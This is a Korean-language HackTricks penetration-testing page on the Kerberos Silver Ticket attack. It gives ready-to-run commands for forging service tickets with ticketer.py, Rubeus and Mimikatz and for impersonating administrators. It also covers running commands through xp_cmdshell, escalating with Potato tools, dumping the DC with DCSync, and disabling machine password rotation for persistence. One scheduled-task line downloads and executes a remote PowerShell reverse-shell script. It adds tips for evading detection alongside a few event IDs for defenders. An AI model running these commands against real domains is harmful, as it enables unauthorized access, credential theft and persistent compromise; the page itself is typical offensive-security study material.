# Silver Ticket

{{#include ../../banners/hacktricks-training.md}}



## Silver ticket

**Silver Ticket** 공격은 Active Directory(AD) 환경에서 service ticket을 악용하는 방식입니다. 이 방법은 computer account와 같은 **service account의 NTLM hash를 획득**하여 Ticket Granting Service(TGS) ticket을 위조하는 방식에 기반합니다. 공격자는 이 위조된 ticket을 사용하여 네트워크의 특정 service에 접근하고, **모든 user를 사칭**할 수 있으며, 일반적으로 administrative privileges 획득을 목표로 합니다. Ticket을 위조할 때 AES key를 사용하는 것이 더 안전하고 탐지 가능성도 낮다는 점이 강조됩니다.<sup>[[1]](#references)[[2]](#references)</sup>

> [!WARNING]
> Silver Ticket은 krbtgt account가 아니라 **service account의 hash만** 필요하므로 Golden Ticket보다 탐지하기 어렵습니다. 그러나 대상으로 지정한 특정 service로 제한됩니다. 또한, user의 password만 탈취하는 것뿐만 아니라,
> **SPN이 있는 account의 password를 확보한 경우**, 해당 password를 사용하여 해당 service에 대해 모든 user를 사칭하는 Silver Ticket을 생성할 수 있습니다.

### 최신 Kerberos 변경 사항 (AES-only 도메인)

- **2022년 11월 8일(KB5021131)**부터 Windows 업데이트는 가능한 경우 service ticket에 **AES session key**를 기본으로 사용하며 RC4를 단계적으로 폐기하고 있습니다. DC는 **2026년 중반까지 RC4가 기본적으로 비활성화된 상태로 제공될 예정**이므로, Silver Ticket에 NTLM/RC4 hash를 의존하면 `KRB_AP_ERR_MODIFIED` 오류와 함께 점점 더 자주 실패합니다. 대상 service account의 **AES key**(`aes256-cts-hmac-sha1-96` / `aes128-cts-hmac-sha1-96`)를 항상 추출하십시오.<sup>[[5]](#references)</sup>
- service account의 `msDS-SupportedEncryptionTypes`가 AES로 제한된 경우 `/aes256` 또는 `-aesKey`를 사용하여 위조해야 합니다. NTLM hash를 보유하고 있더라도 RC4(`/rc4` 또는 `-nthash`)는 작동하지 않습니다.<sup>[[6]](#references)</sup>
- gMSA/computer account는 30일마다 rotation되므로, 위조하기 전에 LSASS, Secretsdump/NTDS 또는 DCsync에서 **현재 AES key**를 dump하십시오.
- OPSEC: tools의 기본 ticket lifetime은 대개 **10년**입니다. 비정상적으로 긴 lifetime으로 인한 탐지를 피하려면 현실적인 duration(예: `-duration 600`분)을 설정하십시오.<sup>[[6]](#references)</sup>

ticket crafting에는 operating system에 따라 서로 다른 tools가 사용됩니다:

### Linux에서
```bash
# Forge with AES instead of RC4 (supports gMSA/machine accounts)
python ticketer.py -aesKey <AES256_HEX> -domain-sid <DOMAIN_SID> -domain <DOMAIN> \
-spn <SERVICE_PRINCIPAL_NAME> <USER>
# or read key directly from a keytab (useful when only keytab is obtained)
python ticketer.py -keytab service.keytab -spn <SPN> -domain <DOMAIN> -domain-sid <DOMAIN_SID> <USER>

# shorten validity for stealth
python ticketer.py -aesKey <AES256_HEX> -domain-sid <DOMAIN_SID> -domain <DOMAIN> \
-spn cifs/<HOST_FQDN> -duration 480 <USER>

export KRB5CCNAME=/root/impacket-examples/<TICKET_NAME>.ccache
python psexec.py <DOMAIN>/<USER>@<TARGET> -k -no-pass
```
### Windows에서
```bash
# Using Rubeus to request a service ticket and inject (works when you already have a TGT)
# /ldap option is used to get domain data automatically
rubeus.exe asktgs /user:<USER> [/aes256:<HASH> /aes128:<HASH> /rc4:<HASH>] \
/domain:<DOMAIN> /ldap /service:cifs/<TARGET_FQDN> /ptt /nowrap /printcmd

# Forging the ticket directly with Mimikatz (silver ticket => /service + /target)
mimikatz.exe "kerberos::golden /domain:<DOMAIN> /sid:<DOMAIN_SID> \
/aes256:<HASH> /user:<USER> /service:<SERVICE> /target:<TARGET> /ptt"
# RC4 still works only if the DC and service accept RC4
mimikatz.exe "kerberos::golden /domain:<DOMAIN> /sid:<DOMAIN_SID> \
/rc4:<HASH> /user:<USER> /service:<SERVICE> /target:<TARGET> /ptt"

# Inject an already forged kirbi
mimikatz.exe "kerberos::ptt <TICKET_FILE>"
.\Rubeus.exe ptt /ticket:<TICKET_FILE>

# Obtain a shell
.\PsExec.exe -accepteula \\<TARGET> cmd
```
CIFS service는 피해자의 file system에 접근하기 위한 일반적인 target로 강조되지만, HOST 및 RPCSS와 같은 다른 service도 task 및 WMI query에 악용할 수 있습니다.

### Example: MSSQL service (MSSQLSvc) + Potato to SYSTEM

SQL service account(예: sqlsvc)의 NTLM hash(또는 AES key)를 가지고 있다면 MSSQL SPN에 대한 TGS를 forge하고 모든 user를 SQL service로 impersonate할 수 있습니다. 그런 다음 xp_cmdshell을 enable하여 SQL service account 권한으로 command를 실행합니다. 해당 token에 SeImpersonatePrivilege가 있다면 Potato를 chain하여 SYSTEM으로 elevate할 수 있습니다.<sup>[[4]](#references)</sup>
```bash
# Forge a silver ticket for MSSQLSvc (AES example)
python ticketer.py -aesKey <SQLSVC_AES256> -domain-sid <DOMAIN_SID> -domain <DOMAIN> \
-spn MSSQLSvc/<host.fqdn>:1433 administrator
export KRB5CCNAME=$PWD/administrator.ccache

# Connect to SQL using Kerberos and run commands via xp_cmdshell
impacket-mssqlclient -k -no-pass <DOMAIN>/administrator@<host.fqdn>:1433 \
-q "EXEC sp_configure 'show advanced options',1;RECONFIGURE;EXEC sp_configure 'xp_cmdshell',1;RECONFIGURE;EXEC xp_cmdshell 'whoami'"
```
- 결과 컨텍스트에 SeImpersonatePrivilege가 있는 경우(서비스 계정에서는 흔히 해당), Potato 변종을 사용해 SYSTEM 권한을 획득합니다:
```bash
# On the target host (via xp_cmdshell or interactive), run e.g. PrintSpoofer/GodPotato
PrintSpoofer.exe -c "cmd /c whoami"
# or
GodPotato -cmd "cmd /c whoami"
```
MSSQL 악용 및 xp_cmdshell 활성화에 대한 자세한 내용:

{{#ref}}
abusing-ad-mssql.md
{{#endref}}

Potato techniques 개요:

{{#ref}}
../windows-local-privilege-escalation/roguepotato-and-printspoofer.md
{{#endref}}

## 사용 가능한 Services

| Service Type                               | Service Silver Tickets                                                     |
| ------------------------------------------ | -------------------------------------------------------------------------- |
| WMI                                        | <p>HOST</p><p>RPCSS</p>                                                    |
| PowerShell Remoting                        | <p>HOST</p><p>HTTP</p><p>OS에 따라 다음도 포함:</p><p>WSMAN</p><p>RPCSS</p> |
| WinRM                                      | <p>HOST</p><p>HTTP</p><p>일부 경우에는 다음만 요청할 수도 있음: WINRM</p> |
| Scheduled Tasks                            | HOST                                                                       |
| Windows File Share, also psexec            | CIFS                                                                       |
| LDAP operations, included DCSync           | LDAP                                                                       |
| Windows Remote Server Administration Tools | <p>RPCSS</p><p>LDAP</p><p>CIFS</p>                                         |
| Golden Tickets                             | krbtgt                                                                     |

**Rubeus**를 사용하면 다음 parameter를 사용하여 이러한 ticket을 **모두 요청**할 수 있습니다:

- `/altservice:host,RPCSS,http,wsman,cifs,ldap,krbtgt,winrm`

### Silver tickets Event IDs

- 4624: Account Logon
- 4634: Account Logoff
- 4672: Admin Logon
- 동일한 client/service에 대해 DC에서 이전의 4768/4769가 **없는 경우**, 위조된 TGS가 service에 직접 제시되었다는 일반적인 지표입니다.
- 비정상적으로 긴 ticket lifetime 또는 예상하지 못한 encryption type(domain에서 AES를 적용하는데 RC4를 사용하는 경우)도 4769/4624 data에서 두드러집니다.

## Persistence

머신이 30일마다 password를 rotation하지 않도록 하려면 `HKLM\SYSTEM\CurrentControlSet\Services\Netlogon\Parameters\DisablePasswordChange = 1`을 설정하거나, `HKLM\SYSTEM\CurrentControlSet\Services\NetLogon\Parameters\MaximumPasswordAge`를 30days보다 큰 값으로 설정하여 머신 password가 rotation되어야 하는 주기를 지정할 수 있습니다.<sup>[[3]](#references)</sup>

## Service tickets 악용

다음 예제에서는 administrator account를 impersonate하여 ticket을 가져왔다고 가정하겠습니다.

### CIFS

이 ticket을 사용하면 **SMB**를 통해 `C$` 및 `ADMIN$` folder(노출되어 있는 경우)에 access하고, 다음과 같이 간단히 remote filesystem의 일부에 file을 copy할 수 있습니다:
```bash
dir \\vulnerable.computer\C$
dir \\vulnerable.computer\ADMIN$
copy afile.txt \\vulnerable.computer\C$\Windows\Temp
```
또한 **psexec**를 사용하여 호스트 내부에서 shell을 획득하거나 임의의 명령을 실행할 수 있습니다:


{{#ref}}
../lateral-movement/psexec-and-winexec.md
{{#endref}}

### HOST

이 권한을 사용하면 원격 컴퓨터에 scheduled tasks를 생성하고 임의의 명령을 실행할 수 있습니다:
```bash
#Check you have permissions to use schtasks over a remote server
schtasks /S some.vuln.pc
#Create scheduled task, first for exe execution, second for powershell reverse shell download
schtasks /create /S some.vuln.pc /SC weekly /RU "NT Authority\System" /TN "SomeTaskName" /TR "C:\path\to\executable.exe"
schtasks /create /S some.vuln.pc /SC Weekly /RU "NT Authority\SYSTEM" /TN "SomeTaskName" /TR "powershell.exe -c 'iex (New-Object Net.WebClient).DownloadString(''http://172.16.100.114:8080/pc.ps1''')'"
#Check it was successfully created
schtasks /query /S some.vuln.pc
#Run created schtask now
schtasks /Run /S mcorp-dc.moneycorp.local /TN "SomeTaskName"
```
### HOST + RPCSS

이 티켓을 사용하면 **피해자 시스템에서 WMI를 실행할 수 있습니다**:
```bash
#Check you have enough privileges
Invoke-WmiMethod -class win32_operatingsystem -ComputerName remote.computer.local
#Execute code
Invoke-WmiMethod win32_process -ComputerName $Computer -name create -argumentlist "$RunCommand"

#You can also use wmic
wmic remote.computer.local list full /format:list
```
다음 페이지에서 **wmiexec에 대한 추가 정보**를 확인하세요:


{{#ref}}
../lateral-movement/wmiexec.md
{{#endref}}

### HOST + WSMAN (WINRM)

컴퓨터에 winrm access가 있으면 해당 컴퓨터에 **access할 수 있고**, PowerShell도 실행할 수 있습니다:
```bash
New-PSSession -Name PSC -ComputerName the.computer.name; Enter-PSSession PSC
```
원격 호스트에 **winrm**을 사용해 연결하는 **더 많은 방법**을 알아보려면 다음 페이지를 확인하세요:


{{#ref}}
../lateral-movement/winrm.md
{{#endref}}

> [!WARNING]
> 원격 컴퓨터에서 **winrm이 활성화되어 수신 대기 중이어야** 액세스할 수 있습니다.

### LDAP

이 권한이 있으면 **DCSync**를 사용해 DC 데이터베이스를 dump할 수 있습니다:
```
mimikatz(commandline) # lsadump::dcsync /dc:pcdc.domain.local /domain:domain.local /user:krbtgt
```
**DCSync에 대해 더 알아보기**:


{{#ref}}
dcsync.md
{{#endref}}


## 참고 자료

- [1] [Kerberos: Silver Tickets - ired.team](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberos-silver-tickets)
- [2] [Kerberos (II): Kerberos를 공격하는 방법? - Tarlogic](https://www.tarlogic.com/blog/how-to-attack-kerberos/)
- [3] [Machine Account Password Process - Microsoft Tech Community](https://techcommunity.microsoft.com/blog/askds/machine-account-password-process/396027)
- [4] [HTB Sendai – 0xdf: Silver Ticket + Potato path](https://0xdf.gitlab.io/2025/08/28/htb-sendai.html)
- [5] [KB5021131 Kerberos hardening & RC4 deprecation](https://support.microsoft.com/en-us/topic/kb5021131-how-to-manage-the-kerberos-protocol-changes-related-to-cve-2022-37966-fd837ac3-cdec-4e76-a6ec-86e67501407d)
- [6] [Impacket ticketer.py current options (AES/keytab/duration)](https://kb.offsec.nl/tools/framework/impacket/ticketer-py/)

{{#include ../../banners/hacktricks-training.md}}
